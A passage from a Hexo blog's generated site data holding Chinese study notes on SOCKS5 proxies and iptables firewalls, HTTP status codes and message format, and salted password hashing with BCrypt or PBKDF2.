href=\"https://zh.wikipedia.org/wiki/SOCKS\" target=\"_blank\" rel=\"noopener\">维基百科</a></p>\n</blockquote>\n<ul>\n<li>SOCKS5 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS 是”SOCKetS”的缩写</li>\n</ul>\n<h2 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h2><ul>\n<li>SOCKS5 是一个代理协议，旨在为位于 Intranet 防火墙后的用户提供访问 Internet 的代理服务，这是个有一定年头的协议，其 RFC 提案的时间比 HTTP 1.0 还要早两个月</li>\n</ul>\n<h2 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h2><ul>\n<li><a href=\"http://zhihan.me/network/2017/09/24/socks5-protocol/\" target=\"_blank\" rel=\"noopener\">防火墙穿透</a></li>\n</ul>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><ul>\n<li><a href=\"https://github.com/gwuhaolin/blog/issues/12\" target=\"_blank\" rel=\"noopener\">socks 代理实现</a></li>\n</ul>\n<h1 id=\"iptables\"><a href=\"#iptables\" class=\"headerlink\" title=\"iptables\"></a>iptables</h1><blockquote>\n<p>以下来自<a href=\"https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">维基百科</a>&gt;)</p>\n</blockquote>\n<ul>\n<li>iptables 是 linux 内核防火墙的命令行工具</li>\n<li>通常也指代内核级防火墙</li>\n<li>iptables 用于 ipv4，ip6tables 用于 ipv6</li>\n<li>iptables 可以检测，修改，转发，重定向和丢弃 ipv4 数据包</li>\n</ul>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><h3 id=\"表（tables）\"><a href=\"#表（tables）\" class=\"headerlink\" title=\"表（tables）\"></a>表（tables）</h3><ul>\n<li>过滤 ipv4 数据包的代码已经内置于内核之中，并且按照不同的目的被组织成表的集合</li>\n<li>表由一组预先定义的链组成，链包含遍历顺序规则</li>\n<li>包含五张表，比较常用的就是 filter 表：用于存放于与防火墙相关操作的默认表</li>\n</ul>\n<h3 id=\"链-chain\"><a href=\"#链-chain\" class=\"headerlink\" title=\"链(chain)\"></a>链(chain)</h3><ul>\n<li>表由链组成</li>\n<li>内核空间中：从一个网络接口进来，到另一个网络接口取得 PREROUTING（路由前）</li>\n<li>数据包从内核流入用户空间的 INPUT （数据包流入口）</li>\n<li>数据包从用户空间流出的 FORWARD （转发关卡）</li>\n<li>进入/离开本机的外网接口 OUTPUT （数据包出口）</li>\n<li>进入/离开本机的内网接口 POSTROUTING （路由后）</li>\n</ul>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><ul>\n<li>去到所在文件，一般是在/etc/init.d/iptables</li>\n<li>可以进行关闭(stop)，开启（start），重启（restart）</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"http://www.cnblogs.com/lvxiaobo616/p/5715739.html\" target=\"_blank\" rel=\"noopener\">iptables 深入理解</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h1><ul>\n<li>在 vultr 买了一个服务器后，发现可以 ping 通</li>\n<li>但是输入网址却无法连接</li>\n<li>但是开启了 ss 之后，可以连接到这个服务器</li>\n</ul>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ul>\n<li>一开始以为是墙的问题，可以封禁端口，导致 80 端口不能使用</li>\n<li>但是我换了其他端口也无法连接</li>\n<li>后来用 wireshark 抓包，发现返回 icmp 协议： host administratively prohibited</li>\n<li>谷歌后查发现是服务器防火墙没有开放 80 端口的缘故</li>\n<li>那么另外一个问题随之而来呢，为什么通过 ss 之后就可以连接到服务器呢</li>\n<li><a href=\"https://github.com/shadowsocks/shadowsocks/issues/1130\" target=\"_blank\" rel=\"noopener\">ss 服务端和 ss 客户端用 socks5 协议封装，服务端再发到真正的目的地</a></li>\n<li>换句话 socks5 协议穿透了防火墙，可以查看<a href=\"https://segmentfault.com/a/1190000011862912#articleHeader2\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n</ul>\n<h1 id=\"SOCK5-协议\"><a href=\"#SOCK5-协议\" class=\"headerlink\" title=\"SOCK5 协议\"></a>SOCK5 协议</h1><blockquote>\n<p>以下来自<a href=\"https://zh.wikipedia.org/wiki/SOCKS\" target=\"_blank\" rel=\"noopener\">维基百科</a></p>\n</blockquote>\n<ul>\n<li>SOCKS5 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS 是”SOCKetS”的缩写</li>\n</ul>\n<h2 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h2><ul>\n<li>SOCKS5 是一个代理协议，旨在为位于 Intranet 防火墙后的用户提供访问 Internet 的代理服务，这是个有一定年头的协议，其 RFC 提案的时间比 HTTP 1.0 还要早两个月</li>\n</ul>\n<h2 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h2><ul>\n<li><a href=\"http://zhihan.me/network/2017/09/24/socks5-protocol/\" target=\"_blank\" rel=\"noopener\">防火墙穿透</a></li>\n</ul>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><ul>\n<li><a href=\"https://github.com/gwuhaolin/blog/issues/12\" target=\"_blank\" rel=\"noopener\">socks 代理实现</a></li>\n</ul>\n<h1 id=\"iptables\"><a href=\"#iptables\" class=\"headerlink\" title=\"iptables\"></a>iptables</h1><blockquote>\n<p>以下来自<a href=\"https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target=\"_blank\" rel=\"noopener\">维基百科</a>&gt;)</p>\n</blockquote>\n<ul>\n<li>iptables 是 linux 内核防火墙的命令行工具</li>\n<li>通常也指代内核级防火墙</li>\n<li>iptables 用于 ipv4，ip6tables 用于 ipv6</li>\n<li>iptables 可以检测，修改，转发，重定向和丢弃 ipv4 数据包</li>\n</ul>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><h3 id=\"表（tables）\"><a href=\"#表（tables）\" class=\"headerlink\" title=\"表（tables）\"></a>表（tables）</h3><ul>\n<li>过滤 ipv4 数据包的代码已经内置于内核之中，并且按照不同的目的被组织成表的集合</li>\n<li>表由一组预先定义的链组成，链包含遍历顺序规则</li>\n<li>包含五张表，比较常用的就是 filter 表：用于存放于与防火墙相关操作的默认表</li>\n</ul>\n<h3 id=\"链-chain\"><a href=\"#链-chain\" class=\"headerlink\" title=\"链(chain)\"></a>链(chain)</h3><ul>\n<li>表由链组成</li>\n<li>内核空间中：从一个网络接口进来，到另一个网络接口取得 PREROUTING（路由前）</li>\n<li>数据包从内核流入用户空间的 INPUT （数据包流入口）</li>\n<li>数据包从用户空间流出的 FORWARD （转发关卡）</li>\n<li>进入/离开本机的外网接口 OUTPUT （数据包出口）</li>\n<li>进入/离开本机的内网接口 POSTROUTING （路由后）</li>\n</ul>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><ul>\n<li>去到所在文件，一般是在/etc/init.d/iptables</li>\n<li>可以进行关闭(stop)，开启（start），重启（restart）</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"http://www.cnblogs.com/lvxiaobo616/p/5715739.html\" target=\"_blank\" rel=\"noopener\">iptables 深入理解</a></li>\n</ul>\n"},{"title":"浅谈http","date":"2018-04-23T11:39:38.000Z","_content":"\n> http（hypertext transfer protocol）超文本传输协议\n\n## http 传输流\n\n> 发送端在层与层间传输，每经过一层都会被加上首部信息，接受端每经过一层都会删除一条\n\n* 应用层：本来是 http 数据\n* 经过传输层，加上 tcp 首部\n* 经过网络层，加上 ip 首部\n* 经过链路层，加上以太网首部\n* 然后接收端依次经过链路层，网络层，传输层，应用层\n\n## 状态码\n\n### 1xx 传达信息\n\n* 100 continue\n* 101 switching protocols\n\n### 2xx 成功\n\n* 200 OK，表示从客户端发来的请求在服务器端被正确处理\n* 204 No content，表示请求成功，但响应报文不含实体的主体部分\n* 206 Partial Content，进行范围请求\n\n### 3xx 重定向\n\n* 301 moved permanently，永久性重定向，表示资源已被分配了新的 URL\n* 302 found，临时性重定向，表示资源临时被分配了新的 URL\n* 303 see other，表示资源存在着另一个 URL，应使用 GET 方法获取资源\n* 304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况\n* 307 temporary redirect，临时重定向，和 302 含义相同\n\n### 4XX 客户端错误\n\n* 400 bad request，请求报文存在语法错误\n* 401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息\n* 403 forbidden，表示对请求资源的访问被服务器拒绝\n* 404 not found，表示在服务器上没有找到请求的资源\n* 405 method not allowed 一般是 get 和 post 弄错了\n\n### 5xx 服务器错误\n\n* 500 internal sever error，表示服务器端在执行请求时发生了错误\n* 503 service unavailable，表明服务器暂时处于超负载或正在停机维护，无法处理请求\n* 504 gateway timeout 网关超时\n\n## http 协议格式\n\n> http 的请求和响应的消息协议是一样的，分为三个部分，起始行，消息头和消息体。这三个部分以 CRLF 作为分隔符，最后一个消息头有两个分隔符，表示消息头部结束。\n\n* 起始行：如 GET /index.html HTTP/1.1\n* 消息头部（http header）：多个键值对组成，如 Content-Encoding: gzip，多个键值对之间使用 CRLF 作为分隔符\n* 消息体（http body）：实体部分，请求实体和响应实体\n\n## http 的无状态性\n\n* 所谓 HTTP 协议的无状态性是指服务器的协议层无需为不同的请求之间建立任何相关关系，它特指的是协议层的无状态性。但是这并不代表建立在 HTTP 协议之上的应用程序就无法维持状态。应用层可以通过会话 Session 来跟踪用户请求之间的相关性，服务器会为每个会话对象绑定一个唯一的会话 ID，浏览器可以将会话 ID 记录在本地缓存 LocalStorage 或者 Cookie，在后续的请求都带上这个会话 ID，服务器就可以为每个请求找到相应的会话状态。\n\n## 输入 url 到页面加载发生了什么\n\n* 输入地址\n* 浏览器查找域名的 IP 地址\n* 这一步包括 DNS 具体的查找过程，包括：浏览器缓存->系统缓存->路由器缓存...\n* 浏览器向 web 服务器发送一个 HTTP 请求\n* 服务器的永久重定向响应（从 http://example.com 到 http://www.example.com）\n* 浏览器跟踪重定向地址\n* 服务器处理请求\n* 服务器返回一个 HTTP 响应\n* 浏览器显示 HTML\n* 浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS 等等）\n* 浏览器发送异步请求\n","source":"_posts/study-http.md","raw":"---\ntitle: 浅谈http\ndate: 2018-04-23 19:39:38\ntags: Http\n---\n\n> http（hypertext transfer protocol）超文本传输协议\n\n## http 传输流\n\n> 发送端在层与层间传输，每经过一层都会被加上首部信息，接受端每经过一层都会删除一条\n\n* 应用层：本来是 http 数据\n* 经过传输层，加上 tcp 首部\n* 经过网络层，加上 ip 首部\n* 经过链路层，加上以太网首部\n* 然后接收端依次经过链路层，网络层，传输层，应用层\n\n## 状态码\n\n### 1xx 传达信息\n\n* 100 continue\n* 101 switching protocols\n\n### 2xx 成功\n\n* 200 OK，表示从客户端发来的请求在服务器端被正确处理\n* 204 No content，表示请求成功，但响应报文不含实体的主体部分\n* 206 Partial Content，进行范围请求\n\n### 3xx 重定向\n\n* 301 moved permanently，永久性重定向，表示资源已被分配了新的 URL\n* 302 found，临时性重定向，表示资源临时被分配了新的 URL\n* 303 see other，表示资源存在着另一个 URL，应使用 GET 方法获取资源\n* 304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况\n* 307 temporary redirect，临时重定向，和 302 含义相同\n\n### 4XX 客户端错误\n\n* 400 bad request，请求报文存在语法错误\n* 401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息\n* 403 forbidden，表示对请求资源的访问被服务器拒绝\n* 404 not found，表示在服务器上没有找到请求的资源\n* 405 method not allowed 一般是 get 和 post 弄错了\n\n### 5xx 服务器错误\n\n* 500 internal sever error，表示服务器端在执行请求时发生了错误\n* 503 service unavailable，表明服务器暂时处于超负载或正在停机维护，无法处理请求\n* 504 gateway timeout 网关超时\n\n## http 协议格式\n\n> http 的请求和响应的消息协议是一样的，分为三个部分，起始行，消息头和消息体。这三个部分以 CRLF 作为分隔符，最后一个消息头有两个分隔符，表示消息头部结束。\n\n* 起始行：如 GET /index.html HTTP/1.1\n* 消息头部（http header）：多个键值对组成，如 Content-Encoding: gzip，多个键值对之间使用 CRLF 作为分隔符\n* 消息体（http body）：实体部分，请求实体和响应实体\n\n## http 的无状态性\n\n* 所谓 HTTP 协议的无状态性是指服务器的协议层无需为不同的请求之间建立任何相关关系，它特指的是协议层的无状态性。但是这并不代表建立在 HTTP 协议之上的应用程序就无法维持状态。应用层可以通过会话 Session 来跟踪用户请求之间的相关性，服务器会为每个会话对象绑定一个唯一的会话 ID，浏览器可以将会话 ID 记录在本地缓存 LocalStorage 或者 Cookie，在后续的请求都带上这个会话 ID，服务器就可以为每个请求找到相应的会话状态。\n\n## 输入 url 到页面加载发生了什么\n\n* 输入地址\n* 浏览器查找域名的 IP 地址\n* 这一步包括 DNS 具体的查找过程，包括：浏览器缓存->系统缓存->路由器缓存...\n* 浏览器向 web 服务器发送一个 HTTP 请求\n* 服务器的永久重定向响应（从 http://example.com 到 http://www.example.com）\n* 浏览器跟踪重定向地址\n* 服务器处理请求\n* 服务器返回一个 HTTP 响应\n* 浏览器显示 HTML\n* 浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS 等等）\n* 浏览器发送异步请求\n","slug":"study-http","published":1,"updated":"2018-04-25T02:48:00.231Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r700370iofg6dv9b4q","content":"<blockquote>\n<p>http（hypertext transfer protocol）超文本传输协议</p>\n</blockquote>\n<h2 id=\"http-传输流\"><a href=\"#http-传输流\" class=\"headerlink\" title=\"http 传输流\"></a>http 传输流</h2><blockquote>\n<p>发送端在层与层间传输，每经过一层都会被加上首部信息，接受端每经过一层都会删除一条</p>\n</blockquote>\n<ul>\n<li>应用层：本来是 http 数据</li>\n<li>经过传输层，加上 tcp 首部</li>\n<li>经过网络层，加上 ip 首部</li>\n<li>经过链路层，加上以太网首部</li>\n<li>然后接收端依次经过链路层，网络层，传输层，应用层</li>\n</ul>\n<h2 id=\"状态码\"><a href=\"#状态码\" class=\"headerlink\" title=\"状态码\"></a>状态码</h2><h3 id=\"1xx-传达信息\"><a href=\"#1xx-传达信息\" class=\"headerlink\" title=\"1xx 传达信息\"></a>1xx 传达信息</h3><ul>\n<li>100 continue</li>\n<li>101 switching protocols</li>\n</ul>\n<h3 id=\"2xx-成功\"><a href=\"#2xx-成功\" class=\"headerlink\" title=\"2xx 成功\"></a>2xx 成功</h3><ul>\n<li>200 OK，表示从客户端发来的请求在服务器端被正确处理</li>\n<li>204 No content，表示请求成功，但响应报文不含实体的主体部分</li>\n<li>206 Partial Content，进行范围请求</li>\n</ul>\n<h3 id=\"3xx-重定向\"><a href=\"#3xx-重定向\" class=\"headerlink\" title=\"3xx 重定向\"></a>3xx 重定向</h3><ul>\n<li>301 moved permanently，永久性重定向，表示资源已被分配了新的 URL</li>\n<li>302 found，临时性重定向，表示资源临时被分配了新的 URL</li>\n<li>303 see other，表示资源存在着另一个 URL，应使用 GET 方法获取资源</li>\n<li>304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况</li>\n<li>307 temporary redirect，临时重定向，和 302 含义相同</li>\n</ul>\n<h3 id=\"4XX-客户端错误\"><a href=\"#4XX-客户端错误\" class=\"headerlink\" title=\"4XX 客户端错误\"></a>4XX 客户端错误</h3><ul>\n<li>400 bad request，请求报文存在语法错误</li>\n<li>401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息</li>\n<li>403 forbidden，表示对请求资源的访问被服务器拒绝</li>\n<li>404 not found，表示在服务器上没有找到请求的资源</li>\n<li>405 method not allowed 一般是 get 和 post 弄错了</li>\n</ul>\n<h3 id=\"5xx-服务器错误\"><a href=\"#5xx-服务器错误\" class=\"headerlink\" title=\"5xx 服务器错误\"></a>5xx 服务器错误</h3><ul>\n<li>500 internal sever error，表示服务器端在执行请求时发生了错误</li>\n<li>503 service unavailable，表明服务器暂时处于超负载或正在停机维护，无法处理请求</li>\n<li>504 gateway timeout 网关超时</li>\n</ul>\n<h2 id=\"http-协议格式\"><a href=\"#http-协议格式\" class=\"headerlink\" title=\"http 协议格式\"></a>http 协议格式</h2><blockquote>\n<p>http 的请求和响应的消息协议是一样的，分为三个部分，起始行，消息头和消息体。这三个部分以 CRLF 作为分隔符，最后一个消息头有两个分隔符，表示消息头部结束。</p>\n</blockquote>\n<ul>\n<li>起始行：如 GET /index.html HTTP/1.1</li>\n<li>消息头部（http header）：多个键值对组成，如 Content-Encoding: gzip，多个键值对之间使用 CRLF 作为分隔符</li>\n<li>消息体（http body）：实体部分，请求实体和响应实体</li>\n</ul>\n<h2 id=\"http-的无状态性\"><a href=\"#http-的无状态性\" class=\"headerlink\" title=\"http 的无状态性\"></a>http 的无状态性</h2><ul>\n<li>所谓 HTTP 协议的无状态性是指服务器的协议层无需为不同的请求之间建立任何相关关系，它特指的是协议层的无状态性。但是这并不代表建立在 HTTP 协议之上的应用程序就无法维持状态。应用层可以通过会话 Session 来跟踪用户请求之间的相关性，服务器会为每个会话对象绑定一个唯一的会话 ID，浏览器可以将会话 ID 记录在本地缓存 LocalStorage 或者 Cookie，在后续的请求都带上这个会话 ID，服务器就可以为每个请求找到相应的会话状态。</li>\n</ul>\n<h2 id=\"输入-url-到页面加载发生了什么\"><a href=\"#输入-url-到页面加载发生了什么\" class=\"headerlink\" title=\"输入 url 到页面加载发生了什么\"></a>输入 url 到页面加载发生了什么</h2><ul>\n<li>输入地址</li>\n<li>浏览器查找域名的 IP 地址</li>\n<li>这一步包括 DNS 具体的查找过程，包括：浏览器缓存-&gt;系统缓存-&gt;路由器缓存…</li>\n<li>浏览器向 web 服务器发送一个 HTTP 请求</li>\n<li>服务器的永久重定向响应（从 <a href=\"http://example.com\" target=\"_blank\" rel=\"noopener\">http://example.com</a> 到 <a href=\"http://www.example.com）\" target=\"_blank\" rel=\"noopener\">http://www.example.com）</a></li>\n<li>浏览器跟踪重定向地址</li>\n<li>服务器处理请求</li>\n<li>服务器返回一个 HTTP 响应</li>\n<li>浏览器显示 HTML</li>\n<li>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS 等等）</li>\n<li>浏览器发送异步请求</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>http（hypertext transfer protocol）超文本传输协议</p>\n</blockquote>\n<h2 id=\"http-传输流\"><a href=\"#http-传输流\" class=\"headerlink\" title=\"http 传输流\"></a>http 传输流</h2><blockquote>\n<p>发送端在层与层间传输，每经过一层都会被加上首部信息，接受端每经过一层都会删除一条</p>\n</blockquote>\n<ul>\n<li>应用层：本来是 http 数据</li>\n<li>经过传输层，加上 tcp 首部</li>\n<li>经过网络层，加上 ip 首部</li>\n<li>经过链路层，加上以太网首部</li>\n<li>然后接收端依次经过链路层，网络层，传输层，应用层</li>\n</ul>\n<h2 id=\"状态码\"><a href=\"#状态码\" class=\"headerlink\" title=\"状态码\"></a>状态码</h2><h3 id=\"1xx-传达信息\"><a href=\"#1xx-传达信息\" class=\"headerlink\" title=\"1xx 传达信息\"></a>1xx 传达信息</h3><ul>\n<li>100 continue</li>\n<li>101 switching protocols</li>\n</ul>\n<h3 id=\"2xx-成功\"><a href=\"#2xx-成功\" class=\"headerlink\" title=\"2xx 成功\"></a>2xx 成功</h3><ul>\n<li>200 OK，表示从客户端发来的请求在服务器端被正确处理</li>\n<li>204 No content，表示请求成功，但响应报文不含实体的主体部分</li>\n<li>206 Partial Content，进行范围请求</li>\n</ul>\n<h3 id=\"3xx-重定向\"><a href=\"#3xx-重定向\" class=\"headerlink\" title=\"3xx 重定向\"></a>3xx 重定向</h3><ul>\n<li>301 moved permanently，永久性重定向，表示资源已被分配了新的 URL</li>\n<li>302 found，临时性重定向，表示资源临时被分配了新的 URL</li>\n<li>303 see other，表示资源存在着另一个 URL，应使用 GET 方法获取资源</li>\n<li>304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况</li>\n<li>307 temporary redirect，临时重定向，和 302 含义相同</li>\n</ul>\n<h3 id=\"4XX-客户端错误\"><a href=\"#4XX-客户端错误\" class=\"headerlink\" title=\"4XX 客户端错误\"></a>4XX 客户端错误</h3><ul>\n<li>400 bad request，请求报文存在语法错误</li>\n<li>401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证信息</li>\n<li>403 forbidden，表示对请求资源的访问被服务器拒绝</li>\n<li>404 not found，表示在服务器上没有找到请求的资源</li>\n<li>405 method not allowed 一般是 get 和 post 弄错了</li>\n</ul>\n<h3 id=\"5xx-服务器错误\"><a href=\"#5xx-服务器错误\" class=\"headerlink\" title=\"5xx 服务器错误\"></a>5xx 服务器错误</h3><ul>\n<li>500 internal sever error，表示服务器端在执行请求时发生了错误</li>\n<li>503 service unavailable，表明服务器暂时处于超负载或正在停机维护，无法处理请求</li>\n<li>504 gateway timeout 网关超时</li>\n</ul>\n<h2 id=\"http-协议格式\"><a href=\"#http-协议格式\" class=\"headerlink\" title=\"http 协议格式\"></a>http 协议格式</h2><blockquote>\n<p>http 的请求和响应的消息协议是一样的，分为三个部分，起始行，消息头和消息体。这三个部分以 CRLF 作为分隔符，最后一个消息头有两个分隔符，表示消息头部结束。</p>\n</blockquote>\n<ul>\n<li>起始行：如 GET /index.html HTTP/1.1</li>\n<li>消息头部（http header）：多个键值对组成，如 Content-Encoding: gzip，多个键值对之间使用 CRLF 作为分隔符</li>\n<li>消息体（http body）：实体部分，请求实体和响应实体</li>\n</ul>\n<h2 id=\"http-的无状态性\"><a href=\"#http-的无状态性\" class=\"headerlink\" title=\"http 的无状态性\"></a>http 的无状态性</h2><ul>\n<li>所谓 HTTP 协议的无状态性是指服务器的协议层无需为不同的请求之间建立任何相关关系，它特指的是协议层的无状态性。但是这并不代表建立在 HTTP 协议之上的应用程序就无法维持状态。应用层可以通过会话 Session 来跟踪用户请求之间的相关性，服务器会为每个会话对象绑定一个唯一的会话 ID，浏览器可以将会话 ID 记录在本地缓存 LocalStorage 或者 Cookie，在后续的请求都带上这个会话 ID，服务器就可以为每个请求找到相应的会话状态。</li>\n</ul>\n<h2 id=\"输入-url-到页面加载发生了什么\"><a href=\"#输入-url-到页面加载发生了什么\" class=\"headerlink\" title=\"输入 url 到页面加载发生了什么\"></a>输入 url 到页面加载发生了什么</h2><ul>\n<li>输入地址</li>\n<li>浏览器查找域名的 IP 地址</li>\n<li>这一步包括 DNS 具体的查找过程，包括：浏览器缓存-&gt;系统缓存-&gt;路由器缓存…</li>\n<li>浏览器向 web 服务器发送一个 HTTP 请求</li>\n<li>服务器的永久重定向响应（从 <a href=\"http://example.com\" target=\"_blank\" rel=\"noopener\">http://example.com</a> 到 <a href=\"http://www.example.com）\" target=\"_blank\" rel=\"noopener\">http://www.example.com）</a></li>\n<li>浏览器跟踪重定向地址</li>\n<li>服务器处理请求</li>\n<li>服务器返回一个 HTTP 响应</li>\n<li>浏览器显示 HTML</li>\n<li>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS 等等）</li>\n<li>浏览器发送异步请求</li>\n</ul>\n"},{"title":"加密传输之加盐","date":"2018-05-13T12:24:03.000Z","_content":"\n## 加盐提高安全性\n\n> 盐：一个随机的字符串，往明文密码和一个随机的字符串拼接在一起\n\n为了应对黑客们用彩虹表破解密码，我们可以先往明文密码加盐，然后再对加盐之后的密码用哈希算法加密。由于盐在密码校验的时候还要用到，因此通常盐和密码的哈希值是存储在一起的。\n\n采用加盐的哈希算法对密码加密，要确保要往每个密码里添加随机的唯一的盐，而不是让所有密码共享一样的盐。\n\n虽然加盐的算法能有效应对彩虹表的破解法，但它的安全级别并不高，因为计算哈希值耗时极短，黑客仍然可以用穷举法来破解，只是增加了一些耗时。\n\n## 用 BCrypt 或者 PBKDF2 增加破解的难度\n\n为了应对暴力破解法，我们需要非常耗时的而不是非常高效的哈希算法。BCrypt 和 PBKDF2 算法应运而生。\n\n这两个算法最大的特点是我们可以通过参数设置重复计算的次数，重复计算的次数越多耗时越长。如果计算一个哈希值需要耗时 1 秒甚至更多，那么黑客们采用暴利法破解密码将几乎不再可能。破解一个 6 位纯数字密码需要耗时 11.5 天，更不要说高安全级别的密码了。\n\n摘自[如何加密传输和存储用户密码](https://zhuanlan.zhihu.com/p/36603247)\n","source":"_posts/study-https-03.md","raw":"---\ntitle: 加密传输之加盐\ndate: 2018-05-13 20:24:03\ntags: 浏览器\n---\n\n## 加盐提高安全性\n\n> 盐：一个随机的字符串，往明文密码和一个随机的字符串拼接在一起\n\n为了应对黑客们用彩虹表破解密码，我们可以先往明文密码加盐，然后再对加盐之后的密码用哈希算法加密。由于盐在密码校验的时候还要用到，因此通常盐和密码的哈希值是存储在一起的。\n\n采用加盐的哈希算法对密码加密，要确保要往每个密码里添加随机的唯一的盐，而不是让所有密码共享一样的盐。\n\n虽然加盐的算法能有效应对彩虹表的破解法，但它的安全级别并不高，因为计算哈希值耗时极短，黑客仍然可以用穷举法来破解，只是增加了一些耗时。\n\n## 用 BCrypt 或者 PBKDF2 增加破解的难度\n\n为了应对暴力破解法，我们需要非常耗时的而不是非常高效的哈希算法。BCrypt 和 PBKDF2 算法应运而生。\n\n这两个算法最大的特点是我们可以通过参数设置重复计算的次数，重复计算的次数越多耗时越长。如果计算一个哈希值需要耗时 1 秒甚至更多，那么黑客们采用暴利法破解密码将几乎不再可能。破解一个 6 位纯数字密码需要耗时 11.5 天，更不要说高安全级别的密码了。\n\n摘自[如何加密传输和存储用户密码](https://zhuanlan.zhihu.com/p/36603247)\n","slug":"study-https-03","published":1,"updated":"2018-05-13T12:30:09.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rc00390iofssh233av","content":"<h2 id=\"加盐提高安全性\"><a href=\"#加盐提高安全性\" class=\"headerlink\" title=\"加盐提高安全性\"></a>加盐提高安全性</h2><blockquote>\n<p>盐：一个随机的字符串，往明文密码和一个随机的字符串拼接在一起</p>\n</blockquote>\n<p>为了应对黑客们用彩虹表破解密码，我们可以先往明文密码加盐，然后再对加盐之后的密码用哈希算法加密。由于盐在密码校验的时候还要用到，因此通常盐和密码的哈希值是存储在一起的。</p>\n<p>采用加盐的哈希算法对密码加密，要确保要往每个密码里添加随机的唯一的盐，而不是让所有密码共享一样的盐。</p>\n<p>虽然加盐的算法能有效应对彩虹表的破解法，但它的安全级别并不高，因为计算哈希值耗时极短，黑客仍然可以用穷举法来破解，只是增加了一些耗时。</p>\n<h2 id=\"用-BCrypt-或者-PBKDF2-增加破解的难度\"><a href=\"#用-BCrypt-或者-PBKDF2-增加破解的难度\" class=\"headerlink\" title=\"用 BCrypt 或者 PBKDF2 增加破解的难度\"></a>用 BCrypt 或者 PBKDF2 增加破解的难度</h2><p>为了应对暴力破解法，我们需要非常耗时的而不是非常高效的哈希算法。BCrypt 和 PBKDF2 算法应运而生。</p>\n<p>这两个算法最大的特点是我们可以通过参数设置重复计算的次数，重复计算的次数越多耗时越长。如果计算一个哈希值需要耗时 1 秒甚至更多，那么黑客们采用暴利法破解密码将几乎不再可能。破解一个 6 位纯数字密码需要耗时 11.5 天，更不要说高安全级别的密码了。</p>\n<p>摘自<a href=\"https://zhuanlan.zhihu.com/p/36603247\" target=\"_blank\" rel=\"noopener\">如何加密传输和存储用户密码</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"加盐提高安全性\"><a href=\"#加盐提高安全性\" class=\"headerlink\" title=\"加盐提高安全性\"></a>加盐提高安全性</h2><blockquote>\n<p>盐：一个随机的字符串，往明文密码和一个随机的字符串拼接在一起</p>\n</blockquote>\n<p>为了应对黑客们用彩虹表破解密码，我们可以先往明文密码加盐，然后再对加盐之后的密码用哈希算法加密。由于盐在密码校验的时候还要用到，因此通常盐和密码的哈希值是存储在一起的。</p>\n<p>采用加盐的哈希算法对密码加密，要确保要往每个密码里添加随机的唯一的盐，而不是让所有密码共享一样的盐。</p>\n<p>虽然加盐的算法能有效应对彩虹表的破解法，但它的安全级别并不高，因为计算哈希值耗时极短，黑客仍然可以用穷举法来破解，只是增加了一些耗时。</p>\n<h2 id=\"用-BCrypt-或者-PBKDF2-增加破解的难度\"><a href=\"#用-BCrypt-或者-PBKDF2-增加破解的难度\" class=\"headerlink\" title=\"用 BCrypt 或者 PBKDF2 增加破解的难度\"></a>用 BCrypt 或者 PBKDF2 增加破解的难度</h2><p>为了应对暴力破解法，我们需要非常耗时的而不是非常高效的哈希算法。BCrypt 和 PBKDF2 算法应运而生。</p>\n<p>这两个算法最大的特点是我们可以通过参数设置重复计算的次数，重复计算的次数越多耗时越长。如果计算一个哈希值需要耗时 1 秒甚至更多，那么黑客们采用暴利法破解密码将几乎不再可能。破解一个 6 位纯数字密码需要耗时 11.5 天，更不要说高安全级别的密码了。</p>\n<p>摘自<a href=\"https://zhuanlan.zhihu.com/p/36603247\" target=\"_blank\" 